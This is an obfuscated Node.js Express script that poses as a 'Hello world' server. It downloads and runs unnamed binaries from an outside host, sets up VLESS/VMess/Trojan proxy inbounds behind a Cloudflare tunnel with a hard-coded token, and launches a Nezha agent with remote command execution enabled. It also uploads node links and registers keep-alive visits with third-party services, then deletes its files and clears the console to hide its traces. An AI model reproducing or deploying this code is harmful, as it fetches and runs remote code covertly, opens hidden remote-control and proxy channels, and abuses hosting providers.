const _0x2919ef=_0x536f;(function(_0x4069d7,_0x493d69){const _0x20f74f=_0x536f,_0x1da716=_0x4069d7();while(!![]){try{const _0x5e23e2=-parseInt(_0x20f74f(0x181))/0x1+parseInt(_0x20f74f(0x177))/0x2+-parseInt(_0x20f74f(0x161))/0x3*(-parseInt(_0x20f74f(0x144))/0x4)+parseInt(_0x20f74f(0x191))/0x5*(-parseInt(_0x20f74f(0x1b1))/0x6)+parseInt(_0x20f74f(0x1a4))/0x7*(parseInt(_0x20f74f(0x1b3))/0x8)+-parseInt(_0x20f74f(0x1d4))/0x9*(parseInt(_0x20f74f(0x176))/0xa)+-parseInt(_0x20f74f(0x19f))/0xb*(-parseInt(_0x20f74f(0x14e))/0xc);if(_0x5e23e2===_0x493d69)break;else _0x1da716['push'](_0x1da716['shift']());}catch(_0x4d3901){_0x1da716['push'](_0x1da716['shift']());}}}(_0x3e67,0x3ae07));const express=require(_0x2919ef(0x130)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2919ef(0x11f)),{promisify}=require('util'),exec=promisify(require(_0x2919ef(0x121))[_0x2919ef(0x183)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2919ef(0x1b2)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2919ef(0x1b2)][_0x2919ef(0x126)]||'',AUTO_ACCESS=process['env'][_0x2919ef(0x165)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x2919ef(0x169),SUB_PATH=process['env'][_0x2919ef(0x159)]||_0x2919ef(0x1b0),PORT=process['env'][_0x2919ef(0x1c7)]||process[_0x2919ef(0x1b2)][_0x2919ef(0x16e)]||0xbb8,UUID=process[_0x2919ef(0x1b2)][_0x2919ef(0x1aa)]||_0x2919ef(0x122),NEZHA_SERVER=process[_0x2919ef(0x1b2)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2919ef(0x1b2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2919ef(0x1b2)][_0x2919ef(0x17d)]||'',ARGO_DOMAIN=process['env'][_0x2919ef(0x11d)]||_0x2919ef(0x153),ARGO_AUTH=process[_0x2919ef(0x1b2)]['ARGO_AUTH']||'eyJhIjoiZmQ5NmE1ZDJkYTJhYzA2MTNiNTUyZDBkYmRkNzgwMTciLCJ0IjoiYTRiMTRmNjgtYWFjMi00ODkxLThmMjYtNmYzZGRlZTYzYzg3IiwicyI6Ik5USmlNelExT0dRdFlUTm1NeTAwTURnMExXSTROall0WTJJM09UVTBNalpsWW1abCJ9',ARGO_PORT=process['env'][_0x2919ef(0x13b)]||0x1f41,CFIP=process[_0x2919ef(0x1b2)][_0x2919ef(0x19a)]||_0x2919ef(0x125),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2919ef(0x1b2)]['NAME']||'jt';function _0x3e67(){const _0x3f2443=['6qgulNm','stringify','https://amd64.ssss.nyc.mn/agent','Subscription\x20uploaded\x20successfully','AUTO_ACCESS','http','?encryption=none&security=tls&sni=','https://oooo.serv00.net/add-url','./tmp','join','tunnel.yml','vmess','https://amd64.ssss.nyc.mn/bot','PORT','/tunnel.yml\x20run','\x0avless://','fileName','/trojan-argo','push','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-p\x20','5010cXKvjo','857066YefYGD','false','forEach','amd','\x20successfully','tunnel.json','NEZHA_KEY','--tls','clear','\x20is\x20running','358036JNqTNO','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','exec','from','readFileSync','text/plain;\x20charset=utf-8','\x22\x20>\x20/dev/null\x202>&1','App\x20is\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','writeFileSync','utf-8','127.0.0.1','Download\x20','/vmess-argo?ed=2560','Error\x20downloading\x20files:','php\x20running\x20error:\x20','5IHMQrJ','chmod','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','list.txt','firefox','Unknown','charAt','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFIP','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','unshift','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','win32','11vmpivS','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','?security=tls&sni=','stream','org','238dUQjYL','floor','\x20already\x20exists','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','2087','UUID','substring','\x20is\x20created','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','quic','Error\x20reading\x20boot.log:','0424','1743492YDRSrc','env','44936jXCeNI','true','base64','\x20>/dev/null\x202>&1\x20&','/dev/null','set','then','pipe','arm','taskkill\x20/f\x20/im\x20','nohup\x20','\x0a\x20\x20credentials-file:\x20','Unhandled\x20error\x20in\x20startserver:','\x20failed:\x20','\x20-c\x20\x22','aarch64','map','https://amd64.ssss.nyc.mn/v1','status','rm\x20-rf\x20','SERVER_PORT','block','xtls-rprx-vision','test','tcp','trojan','country_code','get','random','/config.json\x20>/dev/null\x202>&1\x20&','config.yaml','/vmess-argo','http://ip-api.com/json/','963raHRDW','ArgoDomain:','arm64','direct','npm\x20running\x20error:\x20','2083','https+local://8.8.8.8/dns-query','toString','ARGO_DOMAIN','https://arm64.ssss.nyc.mn/agent','path','match','child_process','cda9b52a-2339-408f-8459-65bf42f2e57f','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readdirSync','cdns.doon.eu.org','PROJECT_URL','Error\x20executing\x20command:\x20','data','application/json','Content-Type','tls','blackhole','\x20>\x20nul\x202>&1','post','countryCode','express','\x0a\x20\x20\x20\x20','/vless-argo','Hello\x20world!','Nodes\x20uploaded\x20successfully','close','length','pop','8443','https://arm64.ssss.nyc.mn/v1','log','ARGO_PORT','Empowerment\x20success\x20for\x20','platform','createWriteStream','2053','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','abcdefghijklmnopqrstuvwxyz','error','&path=%2Fvless-argo%3Fed%3D2560#','509084HLiDnm','https://arm64.ssss.nyc.mn/web','includes','sub.txt','split','all','\x0a\x0avmess://','response','catch','send','831972KryEIb','/sub.txt\x20saved\x20successfully','basename','\x0aclient_secret:\x20','unlink','230000.jtzz.de5.net','&fp=firefox&type=ws&host=','message','filter','none','https://arm64.ssss.nyc.mn/bot','SUB_PATH','https://ipapi.co/json/','unlinkSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Empowerment\x20failed\x20for\x20','existsSync','Skipping\x20adding\x20automatic\x20access\x20task','boot.log'];_0x3e67=function(){return _0x3f2443;};return _0x3e67();}!fs[_0x2919ef(0x15e)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2919ef(0x13a)](FILE_PATH+_0x2919ef(0x1ac))):console[_0x2919ef(0x13a)](FILE_PATH+_0x2919ef(0x1a6));function generateRandomName(){const _0x35419e=_0x2919ef,_0x52a997=_0x35419e(0x141);let _0x51bb73='';for(let _0x41db3a=0x0;_0x41db3a<0x6;_0x41db3a++){_0x51bb73+=_0x52a997[_0x35419e(0x198)](Math[_0x35419e(0x1a5)](Math[_0x35419e(0x1cf)]()*_0x52a997[_0x35419e(0x136)]));}return _0x51bb73;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2919ef(0x16a)](FILE_PATH,npmName),phpPath=path[_0x2919ef(0x16a)](FILE_PATH,phpName),webPath=path[_0x2919ef(0x16a)](FILE_PATH,webName),botPath=path[_0x2919ef(0x16a)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2919ef(0x147)),listPath=path[_0x2919ef(0x16a)](FILE_PATH,_0x2919ef(0x195)),bootLogPath=path[_0x2919ef(0x16a)](FILE_PATH,_0x2919ef(0x160)),configPath=path[_0x2919ef(0x16a)](FILE_PATH,'config.json');function deleteNodes(){const _0x238901=_0x2919ef;try{if(!UPLOAD_URL)return;if(!fs[_0x238901(0x15e)](subPath))return;let _0x58891f;try{_0x58891f=fs[_0x238901(0x185)](subPath,'utf-8');}catch{return null;}const _0x5b0ad5=Buffer[_0x238901(0x184)](_0x58891f,_0x238901(0x1b5))[_0x238901(0x11c)](_0x238901(0x18b)),_0x54c95b=_0x5b0ad5[_0x238901(0x148)]('\x0a')['filter'](_0x7669fa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x238901(0x1ca)](_0x7669fa));if(_0x54c95b['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x238901(0x162)]({'nodes':_0x54c95b}),{'headers':{'Content-Type':_0x238901(0x129)}})[_0x238901(0x14c)](_0x541147=>{return null;}),null;}catch(_0xec9329){return null;}}function cleanupOldFiles(){const _0x202727=_0x2919ef;try{const _0x15a035=fs[_0x202727(0x124)](FILE_PATH);_0x15a035[_0x202727(0x179)](_0x380f45=>{const _0x3477c6=_0x202727,_0x2515d9=path['join'](FILE_PATH,_0x380f45);try{const _0x38ecb8=fs['statSync'](_0x2515d9);_0x38ecb8['isFile']()&&fs[_0x3477c6(0x15b)](_0x2515d9);}catch(_0x13a741){}});}catch(_0x1af849){}}app[_0x2919ef(0x1ce)]('/',function(_0xe318e7,_0x23e8eb){const _0x5c4e16=_0x2919ef;_0x23e8eb[_0x5c4e16(0x14d)](_0x5c4e16(0x133));});async function generateConfig(){const _0x56802f=_0x2919ef,_0x214d99={'log':{'access':_0x56802f(0x1b7),'error':_0x56802f(0x1b7),'loglevel':_0x56802f(0x157)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x56802f(0x1c9)}],'decryption':_0x56802f(0x157),'fallbacks':[{'dest':0xbb9},{'path':_0x56802f(0x132),'dest':0xbba},{'path':_0x56802f(0x1d2),'dest':0xbbb},{'path':_0x56802f(0x172),'dest':0xbbc}]},'streamSettings':{'network':_0x56802f(0x1cb)}},{'port':0xbb9,'listen':_0x56802f(0x18c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x56802f(0x157)},'streamSettings':{'network':_0x56802f(0x1cb),'security':_0x56802f(0x157)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x56802f(0x157)},'streamSettings':{'network':'ws','security':_0x56802f(0x157),'wsSettings':{'path':_0x56802f(0x132)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x56802f(0x1ae)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x56802f(0x18c),'protocol':_0x56802f(0x16c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x56802f(0x166),'tls',_0x56802f(0x1ae)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x56802f(0x18c),'protocol':_0x56802f(0x1cc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x56802f(0x172)}},'sniffing':{'enabled':!![],'destOverride':[_0x56802f(0x166),_0x56802f(0x12b),_0x56802f(0x1ae)],'metadataOnly':![]}}],'dns':{'servers':[_0x56802f(0x11b)]},'outbounds':[{'protocol':'freedom','tag':_0x56802f(0x1d7)},{'protocol':_0x56802f(0x12c),'tag':_0x56802f(0x1c8)}]};fs[_0x56802f(0x18a)](path[_0x56802f(0x16a)](FILE_PATH,'config.json'),JSON['stringify'](_0x214d99,null,0x2));}function getSystemArchitecture(){const _0x15c657=_0x2919ef,_0x21b927=os['arch']();return _0x21b927===_0x15c657(0x1bb)||_0x21b927===_0x15c657(0x1d6)||_0x21b927===_0x15c657(0x1c2)?_0x15c657(0x1bb):_0x15c657(0x17a);}function downloadFile(_0x455c71,_0x377766,_0x388677){const _0x514805=_0x2919ef,_0x2a7ce8=_0x455c71;!fs[_0x514805(0x15e)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x388a9a=fs[_0x514805(0x13e)](_0x2a7ce8);axios({'method':_0x514805(0x1ce),'url':_0x377766,'responseType':_0x514805(0x1a2)})[_0x514805(0x1b9)](_0x3b8eaf=>{const _0x577fd4=_0x514805;_0x3b8eaf['data'][_0x577fd4(0x1ba)](_0x388a9a),_0x388a9a['on']('finish',()=>{const _0x2e4ae6=_0x577fd4;_0x388a9a[_0x2e4ae6(0x135)](),console[_0x2e4ae6(0x13a)](_0x2e4ae6(0x18d)+path[_0x2e4ae6(0x150)](_0x2a7ce8)+_0x2e4ae6(0x17b)),_0x388677(null,_0x2a7ce8);}),_0x388a9a['on']('error',_0x345a56=>{const _0x147403=_0x577fd4;fs[_0x147403(0x152)](_0x2a7ce8,()=>{});const _0x30a790=_0x147403(0x18d)+path['basename'](_0x2a7ce8)+_0x147403(0x1c0)+_0x345a56[_0x147403(0x155)];console[_0x147403(0x142)](_0x30a790),_0x388677(_0x30a790);});})[_0x514805(0x14c)](_0x1a3fa6=>{const _0x513df4=_0x514805,_0x278018=_0x513df4(0x18d)+path['basename'](_0x2a7ce8)+'\x20failed:\x20'+_0x1a3fa6[_0x513df4(0x155)];console['error'](_0x278018),_0x388677(_0x278018);});}async function downloadFilesAndRun(){const _0x17ee97=_0x2919ef,_0x153bb8=getSystemArchitecture(),_0x22b6d1=getFilesForArchitecture(_0x153bb8);if(_0x22b6d1['length']===0x0){console['log'](_0x17ee97(0x15c));return;}const _0x1f482e=_0x22b6d1[_0x17ee97(0x1c3)](_0x4716bc=>{return new Promise((_0x58afcd,_0x30c952)=>{const _0x5bcd68=_0x536f;downloadFile(_0x4716bc[_0x5bcd68(0x171)],_0x4716bc['fileUrl'],(_0x3e33c2,_0x47349e)=>{_0x3e33c2?_0x30c952(_0x3e33c2):_0x58afcd(_0x47349e);});});});try{await Promise[_0x17ee97(0x149)](_0x1f482e);}catch(_0x43b02d){console[_0x17ee97(0x142)](_0x17ee97(0x18f),_0x43b02d);return;}function _0x17d0cd(_0xa26a1e){const _0x1d98c5=_0x17ee97,_0x40f71b=0x1fd;_0xa26a1e[_0x1d98c5(0x179)](_0xb3817d=>{const _0x14aa5f=_0x1d98c5;fs['existsSync'](_0xb3817d)&&fs[_0x14aa5f(0x192)](_0xb3817d,_0x40f71b,_0x85e67a=>{const _0x4fa736=_0x14aa5f;_0x85e67a?console['error'](_0x4fa736(0x15d)+_0xb3817d+':\x20'+_0x85e67a):console[_0x4fa736(0x13a)](_0x4fa736(0x13c)+_0xb3817d+':\x20'+_0x40f71b[_0x4fa736(0x11c)](0x8));});});}const _0x2453bc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x17d0cd(_0x2453bc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5ef0a3=NEZHA_SERVER[_0x17ee97(0x146)](':')?NEZHA_SERVER['split'](':')[_0x17ee97(0x137)]():'',_0x38aebe=new Set([_0x17ee97(0x1a8),_0x17ee97(0x138),'2096','2087',_0x17ee97(0x11a),_0x17ee97(0x13f)]),_0x52c89e=_0x38aebe['has'](_0x5ef0a3)?_0x17ee97(0x1b4):_0x17ee97(0x178),_0x4d988b=_0x17ee97(0x151)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x17ee97(0x123)+_0x52c89e+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x17ee97(0x18a)](path['join'](FILE_PATH,_0x17ee97(0x1d1)),_0x4d988b);const _0x205624=_0x17ee97(0x1bd)+phpPath+_0x17ee97(0x1c1)+FILE_PATH+_0x17ee97(0x1ad);try{await exec(_0x205624),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x5d2236=>setTimeout(_0x5d2236,0x3e8));}catch(_0x5ecb40){console[_0x17ee97(0x142)](_0x17ee97(0x190)+_0x5ecb40);}}else{let _0x121bd3='';const _0x4ef9db=[_0x17ee97(0x1a8),'8443','2096',_0x17ee97(0x1a9),_0x17ee97(0x11a),'2053'];_0x4ef9db[_0x17ee97(0x146)](NEZHA_PORT)&&(_0x121bd3=_0x17ee97(0x17e));const _0x99b89b='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x17ee97(0x175)+NEZHA_KEY+'\x20'+_0x121bd3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x99b89b),console[_0x17ee97(0x13a)](npmName+_0x17ee97(0x180)),await new Promise(_0x3e59e6=>setTimeout(_0x3e59e6,0x3e8));}catch(_0x52ed87){console[_0x17ee97(0x142)](_0x17ee97(0x119)+_0x52ed87);}}}else console[_0x17ee97(0x13a)](_0x17ee97(0x174));const _0x4153ac=_0x17ee97(0x1bd)+webPath+'\x20-c\x20'+FILE_PATH+_0x17ee97(0x1d0);try{await exec(_0x4153ac),console[_0x17ee97(0x13a)](webName+'\x20is\x20running'),await new Promise(_0x5dabd9=>setTimeout(_0x5dabd9,0x3e8));}catch(_0x3e388a){console[_0x17ee97(0x142)]('web\x20running\x20error:\x20'+_0x3e388a);}if(fs[_0x17ee97(0x15e)](botPath)){let _0xad9fc9;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xad9fc9=_0x17ee97(0x140)+ARGO_AUTH;else ARGO_AUTH[_0x17ee97(0x120)](/TunnelSecret/)?_0xad9fc9=_0x17ee97(0x1a7)+FILE_PATH+_0x17ee97(0x16f):_0xad9fc9=_0x17ee97(0x1a0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x17ee97(0x1bd)+botPath+'\x20'+_0xad9fc9+_0x17ee97(0x1b6)),console[_0x17ee97(0x13a)](botName+_0x17ee97(0x180)),await new Promise(_0x416317=>setTimeout(_0x416317,0x7d0));}catch(_0xaa39a4){console[_0x17ee97(0x142)](_0x17ee97(0x127)+_0xaa39a4);}}await new Promise(_0x33048d=>setTimeout(_0x33048d,0x1388));}function getFilesForArchitecture(_0x1f7bca){const _0x325302=_0x2919ef;let _0x345fac;_0x1f7bca==='arm'?_0x345fac=[{'fileName':webPath,'fileUrl':_0x325302(0x145)},{'fileName':botPath,'fileUrl':_0x325302(0x158)}]:_0x345fac=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x325302(0x16d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x505f40=_0x1f7bca===_0x325302(0x1bb)?_0x325302(0x11e):_0x325302(0x163);_0x345fac[_0x325302(0x19c)]({'fileName':npmPath,'fileUrl':_0x505f40});}else{const _0x55b782=_0x1f7bca===_0x325302(0x1bb)?_0x325302(0x139):_0x325302(0x1c4);_0x345fac[_0x325302(0x19c)]({'fileName':phpPath,'fileUrl':_0x55b782});}}return _0x345fac;}function argoType(){const _0x5249be=_0x2919ef;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5249be(0x13a)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x5249be(0x146)]('TunnelSecret')){fs[_0x5249be(0x18a)](path[_0x5249be(0x16a)](FILE_PATH,_0x5249be(0x17c)),ARGO_AUTH);const _0x2877b3='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x5249be(0x1be)+path[_0x5249be(0x16a)](FILE_PATH,'tunnel.json')+_0x5249be(0x182)+ARGO_DOMAIN+_0x5249be(0x19b)+ARGO_PORT+_0x5249be(0x19d);fs[_0x5249be(0x18a)](path['join'](FILE_PATH,_0x5249be(0x16b)),_0x2877b3);}else console['log'](_0x5249be(0x194));}async function extractDomains(){const _0x4ff52a=_0x2919ef;let _0x17fe65;if(ARGO_AUTH&&ARGO_DOMAIN)_0x17fe65=ARGO_DOMAIN,console[_0x4ff52a(0x13a)]('ARGO_DOMAIN:',_0x17fe65),await _0x20a226(_0x17fe65);else try{const _0x5d472c=fs[_0x4ff52a(0x185)](path[_0x4ff52a(0x16a)](FILE_PATH,_0x4ff52a(0x160)),_0x4ff52a(0x18b)),_0x140325=_0x5d472c[_0x4ff52a(0x148)]('\x0a'),_0x13da9c=[];_0x140325[_0x4ff52a(0x179)](_0xa2f20a=>{const _0x1d8fb1=_0x4ff52a,_0x279d85=_0xa2f20a[_0x1d8fb1(0x120)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x279d85){const _0x29dab8=_0x279d85[0x1];_0x13da9c[_0x1d8fb1(0x173)](_0x29dab8);}});if(_0x13da9c[_0x4ff52a(0x136)]>0x0)_0x17fe65=_0x13da9c[0x0],console[_0x4ff52a(0x13a)](_0x4ff52a(0x1d5),_0x17fe65),await _0x20a226(_0x17fe65);else{console[_0x4ff52a(0x13a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4ff52a(0x15b)](path[_0x4ff52a(0x16a)](FILE_PATH,_0x4ff52a(0x160)));async function _0x10ae17(){const _0x13142a=_0x4ff52a;try{process[_0x13142a(0x13d)]==='win32'?await exec(_0x13142a(0x1bc)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x13142a(0x198)](0x0)+']'+botName[_0x13142a(0x1ab)](0x1)+_0x13142a(0x187));}catch(_0x39efa8){}}_0x10ae17(),await new Promise(_0x80d6d3=>setTimeout(_0x80d6d3,0xbb8));const _0x3c2100='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4ff52a(0x193)+ARGO_PORT;try{await exec(_0x4ff52a(0x1bd)+botPath+'\x20'+_0x3c2100+_0x4ff52a(0x1b6)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x624896=>setTimeout(_0x624896,0xbb8)),await extractDomains();}catch(_0x4bfb0b){console['error']('Error\x20executing\x20command:\x20'+_0x4bfb0b);}}}catch(_0x24cfa5){console[_0x4ff52a(0x142)](_0x4ff52a(0x1af),_0x24cfa5);}async function _0x57318f(){const _0x152213=_0x4ff52a;try{const _0x3d9dfa=await axios[_0x152213(0x1ce)](_0x152213(0x15a),{'timeout':0xbb8});if(_0x3d9dfa[_0x152213(0x128)]&&_0x3d9dfa[_0x152213(0x128)][_0x152213(0x1cd)]&&_0x3d9dfa['data'][_0x152213(0x1a3)])return _0x3d9dfa[_0x152213(0x128)][_0x152213(0x1cd)]+'_'+_0x3d9dfa[_0x152213(0x128)]['org'];}catch(_0x189e2e){try{const _0xb63d17=await axios[_0x152213(0x1ce)](_0x152213(0x1d3),{'timeout':0xbb8});if(_0xb63d17[_0x152213(0x128)]&&_0xb63d17[_0x152213(0x128)][_0x152213(0x1c5)]==='success'&&_0xb63d17[_0x152213(0x128)][_0x152213(0x12f)]&&_0xb63d17['data'][_0x152213(0x1a3)])return _0xb63d17[_0x152213(0x128)]['countryCode']+'_'+_0xb63d17[_0x152213(0x128)][_0x152213(0x1a3)];}catch(_0x277b55){}}return _0x152213(0x197);}async function _0x20a226(_0x27fb4c){const _0x11335b=await _0x57318f(),_0x26bf56=NAME?NAME+'-'+_0x11335b:_0x11335b;return new Promise(_0x12e58e=>{setTimeout(()=>{const _0x1d95c6=_0x536f,_0x26deb8={'v':'2','ps':''+_0x26bf56,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d95c6(0x157),'net':'ws','type':'none','host':_0x27fb4c,'path':_0x1d95c6(0x18e),'tls':_0x1d95c6(0x12b),'sni':_0x27fb4c,'alpn':'','fp':_0x1d95c6(0x196)},_0xb85244=_0x1d95c6(0x170)+UUID+'@'+CFIP+':'+CFPORT+_0x1d95c6(0x167)+_0x27fb4c+_0x1d95c6(0x154)+_0x27fb4c+_0x1d95c6(0x143)+_0x26bf56+_0x1d95c6(0x14a)+Buffer[_0x1d95c6(0x184)](JSON['stringify'](_0x26deb8))[_0x1d95c6(0x11c)](_0x1d95c6(0x1b5))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1d95c6(0x1a1)+_0x27fb4c+_0x1d95c6(0x154)+_0x27fb4c+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x26bf56+_0x1d95c6(0x131);console[_0x1d95c6(0x13a)](Buffer[_0x1d95c6(0x184)](_0xb85244)[_0x1d95c6(0x11c)](_0x1d95c6(0x1b5))),fs[_0x1d95c6(0x18a)](subPath,Buffer['from'](_0xb85244)['toString'](_0x1d95c6(0x1b5))),console[_0x1d95c6(0x13a)](FILE_PATH+_0x1d95c6(0x14f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x34ac0e,_0x251b69)=>{const _0x48c4c5=_0x1d95c6,_0x40cc16=Buffer[_0x48c4c5(0x184)](_0xb85244)[_0x48c4c5(0x11c)](_0x48c4c5(0x1b5));_0x251b69[_0x48c4c5(0x1b8)](_0x48c4c5(0x12a),_0x48c4c5(0x186)),_0x251b69['send'](_0x40cc16);}),_0x12e58e(_0xb85244);},0x7d0);});}}async function uploadNodes(){const _0x75c514=_0x2919ef;if(UPLOAD_URL&&PROJECT_URL){const _0x334cea=PROJECT_URL+'/'+SUB_PATH,_0x94cbeb={'subscription':[_0x334cea]};try{const _0x30476d=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x94cbeb,{'headers':{'Content-Type':_0x75c514(0x129)}});return _0x30476d&&_0x30476d['status']===0xc8?(console[_0x75c514(0x13a)](_0x75c514(0x164)),_0x30476d):null;}catch(_0x358f96){if(_0x358f96[_0x75c514(0x14b)]){if(_0x358f96[_0x75c514(0x14b)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5c31af=fs[_0x75c514(0x185)](listPath,_0x75c514(0x18b)),_0x40457e=_0x5c31af['split']('\x0a')[_0x75c514(0x156)](_0x1a7bba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x75c514(0x1ca)](_0x1a7bba));if(_0x40457e['length']===0x0)return;const _0x54d929=JSON[_0x75c514(0x162)]({'nodes':_0x40457e});try{const _0x31e602=await axios[_0x75c514(0x12e)](UPLOAD_URL+'/api/add-nodes',_0x54d929,{'headers':{'Content-Type':'application/json'}});return _0x31e602&&_0x31e602[_0x75c514(0x1c5)]===0xc8?(console['log'](_0x75c514(0x134)),_0x31e602):null;}catch(_0x26fc68){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x307cbb=_0x536f,_0x2c6e54=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c6e54[_0x307cbb(0x173)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c6e54[_0x307cbb(0x173)](phpPath);process[_0x307cbb(0x13d)]===_0x307cbb(0x19e)?exec('del\x20/f\x20/q\x20'+_0x2c6e54['join']('\x20')+_0x307cbb(0x12d),_0x1a5ed8=>{const _0x11240b=_0x307cbb;console['clear'](),console[_0x11240b(0x13a)](_0x11240b(0x188)),console[_0x11240b(0x13a)](_0x11240b(0x199));}):exec(_0x307cbb(0x1c6)+_0x2c6e54['join']('\x20')+'\x20>/dev/null\x202>&1',_0x42161f=>{const _0x168ec2=_0x307cbb;console[_0x168ec2(0x17f)](),console[_0x168ec2(0x13a)]('App\x20is\x20running'),console[_0x168ec2(0x13a)](_0x168ec2(0x199));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5391b0=_0x2919ef;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5391b0(0x13a)](_0x5391b0(0x15f));return;}try{const _0x17dea5=await axios['post'](_0x5391b0(0x168),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5391b0(0x129)}});return console[_0x5391b0(0x13a)]('automatic\x20access\x20task\x20added\x20successfully'),_0x17dea5;}catch(_0xc4c5e5){return console[_0x5391b0(0x142)](_0x5391b0(0x189)+_0xc4c5e5[_0x5391b0(0x155)]),null;}}async function startserver(){const _0x3b85f4=_0x2919ef;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x44b1b3){console[_0x3b85f4(0x142)]('Error\x20in\x20startserver:',_0x44b1b3);}}function _0x536f(_0x48f89d,_0x4468c4){_0x48f89d=_0x48f89d-0x119;const _0x3e67c4=_0x3e67();let _0x536fe2=_0x3e67c4[_0x48f89d];return _0x536fe2;}startserver()[_0x2919ef(0x14c)](_0xf903ba=>{const _0x86db92=_0x2919ef;console[_0x86db92(0x142)](_0x86db92(0x1bf),_0xf903ba);}),app['listen'](PORT,()=>console[_0x2919ef(0x13a)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
